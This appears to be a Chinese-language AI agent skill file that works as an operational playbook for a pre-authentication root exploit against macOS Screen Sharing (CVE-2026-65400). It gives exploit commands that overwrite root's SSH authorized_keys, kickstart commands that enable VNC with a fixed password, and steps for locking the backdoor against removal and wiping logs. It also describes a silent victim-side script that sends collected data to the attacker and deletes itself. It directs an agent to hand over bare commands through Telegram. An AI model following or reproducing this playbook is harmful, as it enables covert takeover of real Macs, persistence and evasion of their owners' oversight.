---
name: 白凝冰·幕府
description: >-
  大爱仙尊·macOS屏幕共享预认证root利用远控。触发CVE-2026-65400/5900/VNC.
---

> **白凝冰**
> 万丈红尘缤纷彩，天涯云水路遥长。
> 此刻风流归天地，不胜水中明月光。

# macos-screensharing-pentest（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/macos-screensharing-pentest/SKILL.md`
- 手法：`传承/逆骨·认族.md`
- 工具：`python3 炼蛊房/reverse_skill_route.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name macos-screensharing-pentest`

---

# macOS 屏幕共享预认证 root 利用与远控手册

## 触发词
CVE-2026-65400 / macOS Screen Sharing / 5900 端口 / Mac VNC 后门 / 被控 Mac 实时桌面

## 核心漏洞：CVE-2026-65400（在野利用，KEV 收录）
- **根因**：`screensharingd`（Screen Sharing / ARD，TCP 5900）的 SRP 认证**状态机缺陷**——frame-length 校验器返回过期成功状态，连接在凭据验证前被标记为已认证。密码学没破，状态机逻辑错。
- **结果**：预认证 root 任意文件读写 + TCC 绕过（FileCopy helper 带 Full Disk Access）。
- **影响版本**：macOS Sonoma < 14.8.9 / Sequoia < 15.7.9 / Tahoe 26 < 26.6.1。
- **修复**：2026-08-06 紧急更新；CISA KEV 2026-08-18 收录，在野活跃利用。
- **RCE 链**：写 `/Library/LaunchDaemons/` 等重启持久化；或覆盖已装软件 PrivilegedHelperTools（`com.microsoft.autoupdate.helper`、`us.zoom.ZoomDaemon`、`com.microsoft.teams.TeamsUpdaterDaemon`）立即触发；或写 SSH 公钥。
- **无效防御**：改密码/删用户/关 legacy VNC 全部无效（bug 在认证之前）。
- **同批关联**：CVE-2026-43760（post-auth confused-context，macOS 26.6 修）。

## PoC 仓库（GitHub）
- `acheong08/CVE-2026-65400`：完整 exploit.py，支持 read + write（`-w 本地文件`、`-m 权限`、`-u 用户`、`-o 保存`）。**write 是整文件覆盖**。
- `panchocosil/CVE-2026-65400-poc`：只读 PoC。
- `HORKimhab/CVE-2026-65400`：⚠️ 含 `get-svn.sh` 疑似供应链投毒，别用。

## 攻击链（授权测试标准打法）
1. 验证：`python3 exploit.py <IP> /etc/sudoers` → "IN without credentials" = 漏洞在
2. 读 loginwindow.plist 拿 lastUserName（找登录用户名）
3. 读原 authorized_keys 合并（防覆盖！）→ 生成 key 时注释 -C "cve65400"（便于清理识别）
4. 写回：`python3 exploit.py <IP> -w merged.key -m 0600 /var/root/.ssh/authorized_keys` → 回读对比 sha256
5. SSH：`ssh -i key root@<IP>`
6. 开 VNC：kickstart 命令（见下）
7. 收尾：cleanup 脚本删 key/关服务/清日志；chflags uchg 锁 authorized_keys 防被清

- 漏洞是 racy 的：默认重试 25 次，失败等 1 分钟再试。
- 攻击机版本/是否开屏幕共享完全无关——漏洞在目标机上，攻击机只需 Python3 + 网络可达 5900。
- 被控方最低门槛：屏幕共享开 + 未打补丁 + 攻击机可达 5900 = 必中。加 SSH 开启 = 完整持久化。

## 开 VNC（实时桌面控制正路）
```bash
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
  -activate -configure -access on \
  -clientopts -setvnclegacy -vnclegacy yes \
  -setvncpw -vncpw '<密码>' -restart -agent -console
# 关闭：
sudo .../kickstart -deactivate -stop
# 状态：.../kickstart -status
```

## macOS 远控选型（关键认知）
- **C2 框架（Sliver/CS/Havoc/Mythic/Merlin）默认无实时桌面控制**——只有 shell/文件/截屏。Merlin 源码无 screenshot 模块。
- **Pupy**：有 screenshot（静态截屏，支持 darwin）、keylogger、webcamsnap，无实时控制。
- **SilentMoonwalk 不是 RAT**！是 Windows 调用栈欺骗 PoC（免杀技术），与远控无关。
- **实时桌面控制 = VNC/ARD 的活**。正路：C2/shell 拿权限 → kickstart 开 VNC → VNC 客户端连 → 用完即关。
- 商业远控（ToDesk/向日葵/AnyDesk）实时最好但特征明显；SSH key 后门最隐蔽（日志最少、零图形特征）。

## 服务器端回传接收（被控方信息 POST 到攻击机）
- 被控方静默脚本：开 5900/22/防火墙 → 采集信息 → curl POST 到攻击机 HTTP 端口 → 收到 HTTP 200 才自毁（rm -f "$0"）。
- 攻击机接收：python HTTP 服务监听端口收 POST。注意先查端口占用（宝塔面板常占 8888，用 ss -tlnp 确认）。
- 回传格式用英文 key=value（用户要求去中文注释），如 VNC_URL=vnc://IP:5900 / VNC_PASS=aa111111。

## 用户偏好（重要）
- 交付命令**用纯文本格式，不要用代码块**——用户 Telegram 复制不了代码块内容（"复制不了的 用正常文字格式发"）。
- 脚本交付给用户时去掉中文注释解释，只留可执行命令（用户嫌啰嗦）。
- 所有输出全中文、简洁分段；验证过才报 ✅，未验证标 ⚠️。

## 服务器上的现成脚本（/root/）
- `attack_auto.sh`：攻击方全自动（漏洞→拿登录用户→写SSH后门→自动开VNC 密码 aa111111→输出VNC地址）。
- `CVE-2026-65400_被控方_自动执行.sh`：被控方静默配置+回传+自毁（参数=攻击机IP）。
- `cleanup_target.sh`：清理不留痕（关服务/删后门key/清日志），可 SSH 远程执行 `ssh -i key root@IP 'bash -s' < cleanup_target.sh`。
- `cve65400_receiver.py` + `cve65400_inbox_check.sh`：服务器常驻接收 + cron 检查投递。
